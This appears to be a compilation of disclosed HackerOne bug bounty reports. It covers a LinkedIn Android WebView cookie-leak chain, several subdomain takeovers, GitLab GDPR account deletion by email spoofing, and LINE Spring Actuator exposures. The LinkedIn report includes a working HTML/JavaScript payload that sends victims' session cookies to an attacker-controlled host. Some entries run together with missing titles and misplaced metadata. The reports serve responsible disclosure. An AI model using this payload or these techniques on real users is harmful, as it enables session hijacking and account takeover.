### [Session Cookie Leakage via Static Header Field in WebViewerFragment](https://hackerone.com/reports/3475626)

- **Report ID:** `3475626`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** LinkedIn

**Vulnerability Information:**

Hello LinkedIn Security Team,

I was able to identify a vulnerability in the `WebViewerFragment` that can lead to leaking the user's cookies to a threat actor. Below, I will explain the finding and provide a PoC.

## Summary

A static field (`CUSTOM_HEADERS`) in `WebViewerFragment` persists cookies across different URL loads, allowing an attacker to chain multiple weaknesses to exfiltrate a victim's LinkedIn session cookies to an attacker-controlled server.

## Root Cause

While the exploitation is complex, the root cause is simple. In the `loadUrl` method of the vulnerable fragment:

```java
public final void loadUrl(Uri uri0) {
    String s = uri0.toString();
    ...
    if(this.shouldUseCookies) {
        CookieManager cookieManager0 = CookieManager.getInstance();
        ...
        String s2 = cookieManager0.getCookie(s);
        ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS; // Static field!
        ...
        if(s2 != null) {
            arrayMap0.put("Cookie", s2);
        }
        this.webView.loadUrl(s, arrayMap0);
        return;
    }
    ...
}
```

The method retrieves cookies for the URL. If cookies exist, they are added to `WebViewerFragment.CUSTOM_HEADERS`.

### The Problem

`WebViewerFragment.CUSTOM_HEADERS` is a **static field that is never cleared** between loads. This means:

1. If the vulnerable fragment opens website A (which has cookies), those cookies are stored in `CUSTOM_HEADERS`
2. If website B is subsequently opened and has no saved cookies, the cookies from website A are still present in `CUSTOM_HEADERS` and will be sent to website B

**Attack Flow:**
1. Victim opens `https://www.linkedin.com` in the Fragment → LinkedIn cookies are saved to `CUSTOM_HEADERS`
2. Victim opens the attacker's website in the Fragment → The LinkedIn cookies already in `CUSTOM_HEADERS` are leaked to the attacker

## Exploitation Chain

There is no deep-link that directly opens the vulnerable fragment. After investigating the application, I discovered a path to reach it through chaining multiple weaknesses.

### Step 1: Weak URL Validation in Verification WebView

The Verification WebView can be opened directly via the `https://www.linkedin.com/trust/verification` deep-link. The handler extracts the URL to load from the `verificationUrl` parameter and validates the host against a whitelist:

```java
if(!z2 && SearchFrameworkPrefetchRepositoryImpl..ExternalSyntheticOutline0.m(2, "trust/verification", s)) {
    ...
    String verificationUrl = uri0.getQueryParameter("verificationUrl");
    ...
    intent8 = verificationUrlMappingImpl1.neptuneTrustVerification(verificationUrl, ...);
    ...
}
```

```java
public final Intent neptuneTrustVerification(String verificationUrl, ...) {
    if(verificationUrl == null) {
        uri1 = null;
    } else {
        uri1 = Uri.parse(s);
        if(uri1.getScheme() == null) {
            uri1 = null;
        } else {
            String host = uri1.getHost();
            if(!CollectionsKt___CollectionsKt.contains(this.supportedUrls, host) || UriUtil.isSuspectedPathTraversalUri(uri1)) {
                uri1 = null;
            }
        }
    }
    ...
}
```

**Weakness:** While the host validation is secure, the scheme is not validated. An attacker can execute JavaScript in the WebView using the `javascript:` scheme. A URL like this will pass validation:

```
javascript://www.linkedin.com/%0aalert(1)
```

However, there is a complication. A parameter is appended to the URL before loading:

```java
Uri.Builder uri$Builder1 = uri$Builder0.appendQueryParameter("renderContext", "trustVerificationDeeplink");
```

This transforms the payload into:
```
javascript://www.linkedin.com/%0aalert(1)?renderContext=trustVerificationDeeplink
```

This is invalid JavaScript and will not execute.

**Bypass:** I discovered that by opening a string and closing it after the `#` (fragment), the injected parameter becomes part of the string:

```
javascript://www.linkedin.com/%0aalert('1#')
```

With the parameter appended, this becomes:
```
javascript://www.linkedin.com/%0aalert('1?renderContext=trustVerificationDeeplink#')
```

This is valid JavaScript that executes successfully.

### Step 2: From VerificationWebView to WebViewerFragment

The Verification WebView exposes a JavaScript Interface that can open the vulnerable fragment:

```java
if(verificationWebViewFeature$createJavascriptInterface$10 != null) {
    webView0.addJavascriptInterface(verificationWebViewFeature$createJavascriptInterface$10, "Android");
}
```

```java
public final class VerificationWebViewFeature.createJavascriptInterface.1 {
    @JavascriptInterface
    public final Unit sendWebMessage(String s) {
        if(s != null) {
            JSONObject jSONObject0 = s == null ? null : new JSONObject(s);
            if(jSONObject0 != null) {
                ...
                Event event4 = new Event(jSONObject0);
                verificationWebViewFeature0._receiveWebMessageLiveData.postValue(event4);
                return Unit.INSTANCE;
            }
        }
    }
}
```

The observer for `_receiveWebMessageLiveData` processes the message:

```java
public final class VerificationWebViewFragment.createJSObserver.1 extends EventObserver {
    ...
    public final boolean onEvent(Object object0) {
        ...
        String s3 = VerificationWebViewFragment.getNonEmptyString("additionalWebViewUrl", ((JSONObject)object0));
        if(s3 != null) {
            WebViewerBundle webViewerBundle0 = WebViewerBundle.create(s3, null, null);
            verificationWebViewFragment0.webRouterUtil.launchWebViewer(webViewerBundle0);
        }
        ...
    }
}
```

Calling `Android.sendWebMessage(JSON.stringify({additionalWebViewUrl: "https://www.linkedin.com"}))` triggers `launchWebViewer` to open the URL.

### Step 3: Forcing the Web Viewer Client

The `launchWebViewer` method uses interceptors to determine which client to use (Browser, Web Viewer, Custom Tabs). To ensure the vulnerable `WebViewerFragment` is used, we need to satisfy an interceptor that sets the client to `web_viewer`:

```java
public class LinkedInUrlRequestInterceptor implements RequestInterceptor {
    @Override
    public final Request intercept(CurrentActivityGetter currentActivityGetter0, Request request0) {
        Activity activity0 = currentActivityGetter0.get();
        if(!WebViewerUtils.isLinkedInUrl(request0.url.toString()) && !WebViewerUtils.isLinkedInArticleUrl(request0.url.toString())) {
            if(activity0 != null && !this.sharedPreferences.sharedPreferences.getBoolean("openWebUrlsInApp", true)) {
                request0.suggestedWebClientName = "browser";
            }
            return request0;
        }
        request0.suggestedWebClientName = "web_viewer";
        return request0;
    }
    ...
}
```

The `isLinkedInArticleUrl` method uses a regex:

```java
public class WebViewerUtils {
    static {
        WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN = Pattern.compile("(http|https)://www.linkedin(-ei)?.com/pulse/+");
    }
    public static boolean isLinkedInArticleUrl(String s) {
        if(!WebViewerUtils.PULSE_CHANNEL_PATTERN.matcher(s).find() && ...) {
            if(WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN.matcher(s).find()) {
                ...
                return true;
            }
        }
        ...
    }
}
```

**Weakness:** The regex does not use `^` anchor, so it matches anywhere in the URL. By appending `http://www.linkedin.com/pulse/1` to our URL, we can pass this check and force the vulnerable fragment to open.

## Proof of Concept

### Steps to Reproduce

1. Host the following HTML on your server, replacing `{COLLABORATOR_HOST}` with your domain:
```html
<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Cookie Leak PoC</title>
</head>
<body>
    <a href="https://www.linkedin.com/trust/verification?verificationUrl=javascript://www.linkedin.com/%250asetTimeout%28%28%29%3D%3E%7BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002f{COLLABORATOR_HOST}%2Fhttp%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%22%7D%27%29%7D%2C%201000%29%3BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002fwww.linkedin.com%2Fhttp%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%23%22%7D%27%29%3B">Click Here</a>
</body>
</html>
```
2. On an Android device with LinkedIn installed, open the HTML page in a mobile browser
3. Tap "Click Here"
4. You will see Linkedin is Opened on WebView.
5. Once you go back or close the WebView, another WebView will launch redirecting to your collaborator server, leaking the cookies.
6. Observe the leaked LinkedIn cookies in your server logs (Cookie header will contain LinkedIn session tokens)

## Impact

- **Complete session takeover** via stolen authentication cookies
- Attacker gains **full access to victim's LinkedIn account**

### [Subdomain takeover on 'de-headless.staging.gymshark.com'](https://hackerone.com/reports/1711890)

- **Report ID:** `1711890`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Gymshark
- **Reporter:** @a-p0c
- **Bounty:** - usd
- **Disclosed:** 2022-10-27T11:14:05.926Z
- **CVE(s):** -

**Vulnerability Information:**

The Gymshark subdomain https://de-headless.staging.gymshark.com/ was pointing to an unclaimed Shopify site. Because of this an attacker could claim this subdomain, via Shopify, and serve their own content.

This is extremely dangerous as an attacker could serve any malicious content on this domain such as malware, domain defacement, phishing campaigns etc. 

Also, phishing victims wouldn't be able to identify the maliciousness of a potential phishing campaign because it would be from a valid Gymshark subdomain.

**Note:** *I have temporarily claimed this domain for PoC and have password protected the site to reduce unnecessary impact to others. I am happy to remove this protection if you require further takeover evidence*.

## Remediation
- Remove the CNAME record for Shopify on 'de-headless.staging.gymshark.com'.
- I can release 'de-headless.staging.gymshark.com' for reclaim if needed.

## PoC Link
https://de-headless.staging.gymshark.com/

## PoC Evidence
{F1954064}
{F1954066}
{F1954069}
{F1954070}

Thanks, A-p0c

## Impact

If an attacker controlled https://de-headless.staging.gymshark.com/ they could host any malicious content they wanted, such as malware, defacement, a convincing phishing campaign

- **Disclosed:** 2022-04-01T15:25:49.253Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,

Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.
Here there is a Sifchain domain  (proxies.sifchain.finance) which is pointing towards vercel pages so  this domain can be taken over can can be used to do any type of attacks mostly i can make a fake login page on your behalf and spoof your users, this is a critical vulnerability and needs to be fixed .

**Vulnerability Information:**

### Summary:
Gitlab allows its user to exercise their GDPR rights (Right to Access/Delete) user data by sending an email to gdpr-request@gitlab.com however gitlab team doesn't ask for security question(i.e Date Of Birth) before deleting the user account moreover doesn't authenticate the incoming emails from their  instance which allows an attacker to delete user accounts without user interaction :
██████

### Steps to reproduce
1. Send an spoofed email from victim's email address to gdpr-request@gitlab.com from a reputable SMTP (e.g: Sendgrid):
███████
2. Victim will receive the following  confirmation email:

{F914565}
3. In the next few days victim's account will be deleted :

██████

### Fix :
* Add second verification i.e ask for DOB,Government ID.

## Impact

Since Gitlab doesn't verify the request with an Valid ID before triggering Right to Access/Deletion this breaches the GDPR Law(Article 15) & moreover allows an attacker to delete User Accounts without user interaction.

### [Route53 Subdomain Takeover on test-cncf-aws.canary.k8s.io](https://hackerone.com/reports/794382)

- **Report ID:** `794382`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Kubernetes
- **Reporter:** @rhynorater
- **Bounty:** - usd
- **Disclosed:** 2021-01-16T06:07:13.398Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I discovered that it was possible to takeover ` test-cncf-aws.canary.k8s.io` by assigning a zone to that name with one of the following nameservers in Route53:
```
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-265.awsdns-33.com.
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-687.awsdns-21.net.
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-1458.awsdns-54.org.
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-1825.awsdns-36.co.uk.
```
Once the zone was claimed, I was able to create DNS records under this host. Consider the following record:
```
poc.test-cncf-aws.canary.k8s.io
```

##Steps To Reproduce:
1. See above domain

##Remediation Instructions
Remove the NS record delegation NS privs on a subdomain before you delete the zone

## Impact

With this vulnerability, an attacker can host arbitrary content under your domain. This can allow an attacker to host brand-damaging materials, steal sensitive * scoped session cookies, and even escalate other vulnerabilities.

### [Subdomain Takeover due to unclaimed domain pointing to Acquia Cloud](https://hackerone.com/reports/874482)

- **Report ID:** `874482`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Insulet Corporation
- **Reporter:** @kumarp16
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T14:00:28.738Z
- **CVE(s):** -

**Vulnerability Information:**

ssue Details

The consultant identified that subdomain http:// or https://qa.myomnipod.com 

Web Site Not Found

Sorry, we could not find any content for this web address. Please check the URL.

If you are an Acquia Cloud customer and expect to see your site at this address, you'll need to add this domain name to your site via the Acquia Network management console.

Error Is displayed.

How did you come across this bug ?

Using enumeration, I was able to discover this domain and determined it

NOTE: The hostname was not claimed by me also because i need to pay certain amount to host a website.

## Impact

Sub-domain take over attacks can happen when a company creates a dns entry that points to a third party service, however forgets about the third party application leaving it vulnerable to be hijacked by another party. Hackers can claim subdomains with the help of external services. This attack is practically non-traceable.

### [Spring Actuator endpoints publicly available and broken authentication](https://hackerone.com/reports/838635)

- **Report ID:** `838635`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** LY Corporation
- **Reporter:** @kazan71p
- **Bounty:** 12500 usd
- **Disclosed:** 2020-08-06T05:13:26.680Z
- **CVE(s):** -

**Summary (team):**

Due to insufficient access control, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env. @kazan71p identified two highly sensitive applications leaking information through these endpoints.

The LINE Security team shutdown the secondary endpoints just as it was discovered by the reporter, as part of our incident response process. After further investigation, we also found that both applications had the same issue with their authentication functionality, due to using the same library. The issue was that old tokens were not expiring and being properly invalidated, allowing for replay attacks that should not have been possible.

The applications were highly sensitive in nature, but due to not being able to retrieve specific data, we decided to award a bounty slightly below the maximum reward for this type of issue. We want to thank @kazan71p  for his cooperation and contribution to our program!

### [Spring Actuator endpoints publicly available, leading to account takeover](https://hackerone.com/reports/862589)

- **Report ID:** `862589`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** LY Corporation
- **Reporter:** @kazan71p
- **Bounty:** 5000 usd
- **Disclosed:** 2020-08-04T02:52:31.171Z
- **CVE(s):** -

**Summary (team):**

Due to insufficient access controls, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env. The /heapdump endpoint leaks data from the Java Virtual Machine, leading to disclosure of admin credentials, user tokens and a combination of other data.

This endpoint was not discovered by the internal security team due to being put on a custom path, avoiding detection through our usual means. The reporter accessing this endpoint also triggered a warning for our CSIRT team, allowing us to take quick and coordinated action. After quickly restricting access to this endpoint, we investigated and found no activity except that of the reporter.

The maximum impact of this issue was potential takeover of random LINE Official Accounts through leaked tokens/cookies. We appreciate the professionalism and clear communication from @kazan71p and want to thank him for helping keep LINE secure.
